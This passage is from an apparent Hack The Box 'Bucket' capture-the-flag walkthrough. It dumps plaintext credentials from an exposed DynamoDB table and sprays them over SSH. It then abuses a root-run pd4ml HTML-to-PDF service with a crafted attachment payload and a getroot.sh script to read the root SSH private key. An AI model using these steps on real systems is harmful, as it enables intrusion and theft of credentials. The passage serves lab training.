    <span style="color:#f92672">]</span>
<span style="color:#f92672">}</span>
</code></pre></div><p>I can read the content of table <code>users</code> with the subcommand <code>scan</code>, and it discovers several credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;Items&#34;</span>: <span style="color:#f92672">[</span>
        <span style="color:#f92672">{</span>
            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Management@#1@#&#34;</span>
            <span style="color:#f92672">}</span>,
            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Mgmt&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span>,
        <span style="color:#f92672">{</span>
            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Welcome123!&#34;</span>
            <span style="color:#f92672">}</span>,
            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Cloudadm&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span>,
        <span style="color:#f92672">{</span>
            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;n2vM-&lt;_K_Q:.Aa2&#34;</span>
            <span style="color:#f92672">}</span>,
            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Sysadm&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span>
    <span style="color:#f92672">]</span>,
    <span style="color:#e6db74">&#34;Count&#34;</span>: 3,
    <span style="color:#e6db74">&#34;ScannedCount&#34;</span>: 3,
    <span style="color:#e6db74">&#34;ConsumedCapacity&#34;</span>: null
<span style="color:#f92672">}</span>
</code></pre></div><p>I&rsquo;ll keep those credentials.</p>
<h4 id="ssh-access">SSH Access</h4>
<p>Password <code>n2vM-&lt;_K_Q:.Aa2</code> works on <code>roy</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ crackmapexec ssh <span style="color:#e6db74">&#39;10.10.10.212&#39;</span> -u roy -p passwords.list
SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> roy:Management@#1@# Authentication failed.
SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> roy:Welcome123! Authentication failed.
SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> roy:n2vM-&lt;_K_Q:.Aa2 
</code></pre></div><p>Now I can login into the system using <code>roy</code> credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «bucket» «10.10.14.39» 
$ ssh roy@10.10.10.212
roy@10.10.10.212&#39;s password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

...&lt;SNIP&gt;...
  System load:                      0.02
  Usage of /:                       33.8% of 17.59GB
  Memory usage:                     29%
  Swap usage:                       0%
  Processes:                        252
  Users logged in:                  0
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:df48

...&lt;SNIP&gt;...
roy@bucket:~$ id
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
roy@bucket:~$ 
</code></pre></div><p>The user flag is done here.</p>
<p><div class="img-container"><img src="imgs/image-20210423013951765.png" alt="image-20210423013951765"  /></div>
</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>Running WinPEAS discovers another service currently running on port 8000.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                 
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                     
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:46275         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
</code></pre></div><p>It also discovers that <code>bucket-app</code> in <code>/var/www/</code> is belong to the root user and readable to user <code>roy</code> but not to others.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[+] Readable files belonging to root and readable by me but not world readable
-rwxr-x---+ 1 root root 808729 Jun 10  2020 /var/www/bucket-app/pd4ml_demo.jar                                 
-rw-r-x---+ 1 root root 358 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/README.md
-rw-r-x---+ 1 root root 1085 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/LICENSE
-rw-r-x---+ 1 root root 4689 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/UploadedFileInterface.php
-rw-r-x---+ 1 root root 4746 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/StreamInterface.php
</code></pre></div><p>I can list the contents inside <code>bucket-app</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ ls -la
total <span style="color:#ae81ff">856</span>
drwxr-x---+  <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 .
drwxr-xr-x   <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 ..
-rw-r-x---+  <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">63</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> composer.json
-rw-r-x---+  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">20533</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> composer.lock
drwxr-x---+  <span style="color:#ae81ff">2</span> root root   <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 12:38 files
-rwxr-x---+  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">17222</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> index.php
-rwxr-x---+  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">808729</span> Jun <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> pd4ml_demo.jar
drwxr-x---+ <span style="color:#ae81ff">10</span> root root   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 vendor
</code></pre></div><p>According to the Apache config file, the service on port 8000 is an internal website, and it is assigned to the root user. In other words, it is running as root.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">roy@bucket:~$ cat /etc/apache2/sites-available/000-default.conf 

<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">127.0.0.1:8000</span><span style="color:#f92672">&gt;</span> # unknown
        <span style="color:#f92672">&lt;IfModule</span> <span style="color:#960050;background-color:#1e0010">mpm_itk_module</span><span style="color:#f92672">&gt;</span>
                AssignUserId root root
        <span style="color:#f92672">&lt;/IfModule&gt;</span>
        DocumentRoot /var/www/bucket-app
<span style="color:#f92672">&lt;/VirtualHost&gt;</span>

<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">*:80</span><span style="color:#f92672">&gt;</span> # bucket.htb
        DocumentRoot /var/www/html
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^bucket.htb$
        RewriteRule /.* http://bucket.htb/ [R]
<span style="color:#f92672">&lt;/VirtualHost&gt;</span>
<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">*:80</span><span style="color:#f92672">&gt;</span> # s3.bucket.htb 

        ProxyPreserveHost on
        ProxyPass / http://localhost:4566/
        ProxyPassReverse / http://localhost:4566/
        <span style="color:#f92672">&lt;Proxy</span> <span style="color:#960050;background-color:#1e0010">*</span><span style="color:#f92672">&gt;</span>
                 Order deny,allow
                 Allow from all
         <span style="color:#f92672">&lt;/Proxy&gt;</span>
        ServerAdmin webmaster@localhost
        ServerName s3.bucket.htb

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

<span style="color:#f92672">&lt;/VirtualHost&gt;</span>
</code></pre></div><h4 id="internal-web">Internal Web</h4>
<p>I&rsquo;ll expose the internal web to my localhost on the same port using SSH local port forwarding.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ ~C
ssh&gt; -L 8000:127.0.0.1:8000
Forwarding port.
roy@bucket:/var/www/bucket-app$
</code></pre></div><p>The website page says the site is under construction.</p>
<p><div class="img-container"><img src="imgs/image-20210423015905604.png" alt="image-20210423015905604"  /></div>
</p>
<h4 id="source-code-review">Source Code Review</h4>
<p>Upon reviewing the <code>index.php</code>, I found out that this website can be abused.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ cat index.php 

&lt;?php
require <span style="color:#e6db74">&#39;vendor/autoload.php&#39;</span>;
use Aws<span style="color:#ae81ff">\D</span>ynamoDb<span style="color:#ae81ff">\D</span>ynamoDbClient;
<span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$_SERVER<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span><span style="color:#f92672">]===</span><span style="color:#e6db74">&#34;POST&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;action&#34;</span><span style="color:#f92672">]===</span><span style="color:#e6db74">&#34;get_alerts&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span> <span style="color:#75715e"># POST action=get_alerts </span>
                date_default_timezone_set<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;America/New_York&#39;</span><span style="color:#f92672">)</span>;
                $client <span style="color:#f92672">=</span> new DynamoDbClient<span style="color:#f92672">([</span>  <span style="color:#75715e"># Connect to DynamoDB.</span>
                        <span style="color:#e6db74">&#39;profile&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;default&#39;</span>,
                        <span style="color:#e6db74">&#39;region&#39;</span>  <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;us-east-1&#39;</span>,
                        <span style="color:#e6db74">&#39;version&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;latest&#39;</span>,
                        <span style="color:#e6db74">&#39;endpoint&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;http://localhost:4566&#39;</span>
                <span style="color:#f92672">])</span>;
                
                $iterator <span style="color:#f92672">=</span> $client-&gt;getIterator<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Scan&#39;</span>, array<span style="color:#f92672">(</span> <span style="color:#75715e"># Read content from table alerts</span>
                        <span style="color:#e6db74">&#39;TableName&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;alerts&#39;</span>,
                        <span style="color:#e6db74">&#39;FilterExpression&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;title = :title&#34;</span>, <span style="color:#75715e"># Filter by title</span>
                        <span style="color:#e6db74">&#39;ExpressionAttributeValues&#39;</span> <span style="color:#f92672">=</span>&gt; array<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;:title&#34;</span><span style="color:#f92672">=</span>&gt;array<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;S&#34;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#34;Ransomware&#34;</span><span style="color:#f92672">))</span>,
                <span style="color:#f92672">))</span>;

                foreach <span style="color:#f92672">(</span>$iterator as $item<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>  <span style="color:#75715e"># </span>
                        $name<span style="color:#f92672">=</span>rand<span style="color:#f92672">(</span>1,10000<span style="color:#f92672">)</span>.<span style="color:#e6db74">&#39;.html&#39;</span>; <span style="color:#75715e"># Generate randomnumber.html </span>
                        file_put_contents<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;files/&#39;</span>.$name,$item<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;data&#34;</span><span style="color:#f92672">])</span>; <span style="color:#75715e"># Write contents to randomnumber.html</span>
                <span style="color:#f92672">}</span>
                passthru<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span>$name<span style="color:#e6db74"> 800 A4 -out files/result.pdf&#34;</span><span style="color:#f92672">)</span>; <span style="color:#75715e"># convert randomnumber.html to result.pdf</span>
        <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
<span style="color:#66d9ef">else</span>
<span style="color:#f92672">{</span>
?&gt;
...&lt;SNIP&gt;...
</code></pre></div><p>Let&rsquo;s break it down.</p>
<p>When there is a POST request contains data of <code>action=get_alerts</code>, the site will create a connection to DynamoDB.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>($_SERVER[<span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span>]<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;POST&#34;</span>) {
        <span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#34;action&#34;</span>]<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;get_alerts&#34;</span>) { <span style="color:#75715e"># POST action=get_alerts 
</span><span style="color:#75715e"></span>                <span style="color:#a6e22e">date_default_timezone_set</span>(<span style="color:#e6db74">&#39;America/New_York&#39;</span>);
                $client <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DynamoDbClient</span>([  <span style="color:#75715e"># Connect to DynamoDB.
</span><span style="color:#75715e"></span>                        <span style="color:#e6db74">&#39;profile&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;default&#39;</span>,
                        <span style="color:#e6db74">&#39;region&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;us-east-1&#39;</span>,
                        <span style="color:#e6db74">&#39;version&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;latest&#39;</span>,
                        <span style="color:#e6db74">&#39;endpoint&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;http://localhost:4566&#39;</span>
                ]);
</code></pre></div><p>It then reads every item in table <code>alerts</code> and filters out the result only to the one that contains string value of “Ransomware” (the key).</p>
<blockquote>
<p>DynamoDB is key-value NoSQL database.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$iterator <span style="color:#f92672">=</span> $client<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getIterator</span>(<span style="color:#e6db74">&#39;Scan&#39;</span>, <span style="color:#66d9ef">array</span>( <span style="color:#75715e"># Read content from table alerts
</span><span style="color:#75715e"></span>       <span style="color:#e6db74">&#39;TableName&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;alerts&#39;</span>,
       <span style="color:#e6db74">&#39;FilterExpression&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;title = :title&#34;</span>, <span style="color:#75715e"># Filter by title
</span><span style="color:#75715e"></span>       <span style="color:#e6db74">&#39;ExpressionAttributeValues&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;:title&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;S&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;Ransomware&#34;</span>)),
));
</code></pre></div><p>For each result, it writes the result value ($item[“data”]) of &ldquo;Ransomware&rdquo; to a randomly named HTML file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">foreach</span> ($iterator <span style="color:#66d9ef">as</span> $item) {  <span style="color:#75715e"># 
</span><span style="color:#75715e"></span>        $name<span style="color:#f92672">=</span><span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10000</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.html&#39;</span>; <span style="color:#75715e"># Generate randomnumber.html 
</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;files/&#39;</span><span style="color:#f92672">.</span>$name,$item[<span style="color:#e6db74">&#34;data&#34;</span>]); <span style="color:#75715e"># Write contents to randomnumber.html
</span><span style="color:#75715e"></span>}
</code></pre></div><p>The HTML file then gets converted into a PDF file (<code>result.pdf</code>) using <code>pd4ml</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">passthru</span>(<span style="color:#e6db74">&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span style="color:#e6db74">$name</span><span style="color:#e6db74"> 800 A4 -out files/result.pdf&#34;</span>); <span style="color:#75715e"># convert randomnumber.html to result.pdf
</span></code></pre></div><p>From the enumeration above on the DynamoDB, I know there is no table called <code>alerts</code>.</p>
<p>The idea is, if I have a control over the <code>alerts</code> table as well as the write and read operations on the table, then I can abuse this web application to read almost any file on the system* (arbitrary file read)</p>
<blockquote>
<p>*The web application is currently running as root</p>
</blockquote>
<h4 id="obtain-root-ssh-key">Obtain root SSH Key</h4>
<p>First I’ll try to create a dummy table on the database. I’ll use JSON file to create it.</p>
<p><code>test-table.json</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
	<span style="color:#f92672">&#34;TableName&#34;</span>: <span style="color:#e6db74">&#34;iamf&#34;</span>,
	<span style="color:#f92672">&#34;AttributeDefinitions&#34;</span>: 
	[
		{ <span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>, <span style="color:#f92672">&#34;AttributeType&#34;</span> : <span style="color:#e6db74">&#34;S&#34;</span> }
	],
	<span style="color:#f92672">&#34;KeySchema&#34;</span>: 
	[ 
		{ <span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>, <span style="color:#f92672">&#34;KeyType&#34;</span> : <span style="color:#e6db74">&#34;HASH&#34;</span> }
	],
	<span style="color:#f92672">&#34;ProvisionedThroughput&#34;</span> : 
		{ <span style="color:#f92672">&#34;WriteCapacityUnits&#34;</span>: <span style="color:#ae81ff">5</span>, <span style="color:#f92672">&#34;ReadCapacityUnits&#34;</span>: <span style="color:#ae81ff">10</span> }
}
</code></pre></div><p>Now I can use the subcommand <code>create-table</code> with <code>--cli-input-json</code> option and specify the JSON file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb create-table --cli-input-json file://test-table.json --endpoint-url  http://s3.bucket.htb

<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;TableDescription&#34;</span>: <span style="color:#f92672">{</span>
        <span style="color:#e6db74">&#34;AttributeDefinitions&#34;</span>: <span style="color:#f92672">[</span>
            <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>,
                <span style="color:#e6db74">&#34;AttributeType&#34;</span>: <span style="color:#e6db74">&#34;S&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">]</span>,
        <span style="color:#e6db74">&#34;TableName&#34;</span>: <span style="color:#e6db74">&#34;iamf&#34;</span>,
        <span style="color:#e6db74">&#34;KeySchema&#34;</span>: <span style="color:#f92672">[</span>
            <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>,
                <span style="color:#e6db74">&#34;KeyType&#34;</span>: <span style="color:#e6db74">&#34;HASH&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">]</span>,
        <span style="color:#e6db74">&#34;TableStatus&#34;</span>: <span style="color:#e6db74">&#34;ACTIVE&#34;</span>,
        <span style="color:#e6db74">&#34;CreationDateTime&#34;</span>: <span style="color:#e6db74">&#34;2021-04-22T15:22:33.634000-04:00&#34;</span>,
...&lt;SNIP&gt;...
</code></pre></div><p>I can confirm the table has been created using the subcommand <code>list-tables</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb

<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;TableNames&#34;</span>: <span style="color:#f92672">[</span>
        <span style="color:#e6db74">&#34;iamf&#34;</span>,
        <span style="color:#e6db74">&#34;users&#34;</span>
    <span style="color:#f92672">]</span>
<span style="color:#f92672">}</span>
</code></pre></div><blockquote>
<p>I can also insert items to the table, but I&rsquo;ll skip it here. Detailed notes are available on my GitHub.</p>
</blockquote>
<p>Knowing this, now I can create the <code>alerts</code> table. I’ll write it on JSON format as well.</p>
<p><code>alert-table.json</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
        <span style="color:#f92672">&#34;TableName&#34;</span>: <span style="color:#e6db74">&#34;alerts&#34;</span>,
        <span style="color:#f92672">&#34;AttributeDefinitions&#34;</span>:
        [
                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;title&#34;</span>, <span style="color:#f92672">&#34;AttributeType&#34;</span> : <span style="color:#e6db74">&#34;S&#34;</span>},
                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#f92672">&#34;AttributeType&#34;</span> : <span style="color:#e6db74">&#34;S&#34;</span>}
        ],
        <span style="color:#f92672">&#34;KeySchema&#34;</span>:
        [
                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;title&#34;</span>, <span style="color:#f92672">&#34;KeyType&#34;</span> : <span style="color:#e6db74">&#34;HASH&#34;</span>},
                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#f92672">&#34;KeyType&#34;</span> : <span style="color:#e6db74">&#34;RANGE&#34;</span>}
        ],
        <span style="color:#f92672">&#34;ProvisionedThroughput&#34;</span> :
        {<span style="color:#f92672">&#34;WriteCapacityUnits&#34;</span>: <span style="color:#ae81ff">5</span>, <span style="color:#f92672">&#34;ReadCapacityUnits&#34;</span>: <span style="color:#ae81ff">10</span>}
}
</code></pre></div><p>Now to abuse the application for file read, I’ll put the root SSH key path within <code>&lt;pd4ml:attachment&gt;</code> tags. The tags can be used to embed a file [<a href="https://pd4ml.com/html.htm">source</a>]. I&rsquo;ll write it on JSON format and name it as <code>payload.json</code></p>
<p><code>payload.json</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
	<span style="color:#f92672">&#34;title&#34;</span>: { <span style="color:#f92672">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Ransomware&#34;</span> }, 
    <span style="color:#f92672">&#34;data&#34;</span>: { <span style="color:#f92672">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;&lt;pd4ml:attachment&gt;file:///root/.ssh/id_rsa&lt;/pd4ml:attachment&gt;&#34;</span> }
}
</code></pre></div><p>And finally, I’ll use a bash script to perform the execution, this is because there is a clean up script on the box. I’ll name the script as <code>getroot.sh</code>.</p>
<p><code>getroot.sh</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
echo <span style="color:#e6db74">&#34;[+] Create table&#34;</span>
aws dynamodb create-table --cli-input-json file://alerts-table.json --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb &gt;/dev/null
sleep 0.5
echo <span style="color:#e6db74">&#34;[+] Insert item&#34;</span>
aws dynamodb put-item --table-name alerts --item file://insert.json --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb &gt;/dev/null
sleep 0.5
echo <span style="color:#e6db74">&#34;[+] Send get alerts&#34;</span>
curl -svd <span style="color:#e6db74">&#34;action=get_alerts&#34;</span> http://127.0.0.1:8000/ <span style="color:#75715e"># The port 8000 on Bucket forwarded to localhost:8000</span>
</code></pre></div><blockquote>
<p>The script assume all the required files are stored in the same folder.</p>
</blockquote>
<p>I’ll watch the result.pdf at <code>/var/www/bucket/files</code> and grab the SSH key using <code>roy</code>’s session.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app/files$ <span style="color:#66d9ef">while</span> sleep 2; <span style="color:#66d9ef">do</span> sed -n <span style="color:#e6db74">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null; <span style="color:#66d9ef">done</span>
</code></pre></div><p>Now I can just execute the <code>getroot.sh</code> script and wait for it to complete.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ ./getroot.sh  

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Create table
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Insert item
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Send get alerts
*   Trying 127.0.0.1:8000...
* TCP_NODELAY set
* Connected to 127.0.0.1 <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span> port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
&gt; POST / HTTP/1.1
&gt; Host: 127.0.0.1:8000
&gt; User-Agent: curl/7.66.0
&gt; Accept: */*
&gt; Content-Length: <span style="color:#ae81ff">17</span>
&gt; Content-Type: application/x-www-form-urlencoded
&gt; 
* upload completely sent off: <span style="color:#ae81ff">17</span> out of <span style="color:#ae81ff">17</span> bytes
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 <span style="color:#ae81ff">200</span> OK
&lt; Date: Thu, <span style="color:#ae81ff">22</span> Apr <span style="color:#ae81ff">2021</span> 20:04:14 GMT
&lt; Server: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
&lt; Content-Length: <span style="color:#ae81ff">0</span>
&lt; Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
&lt; 
* Connection <span style="color:#75715e">#0 to host 127.0.0.1 left intact</span>
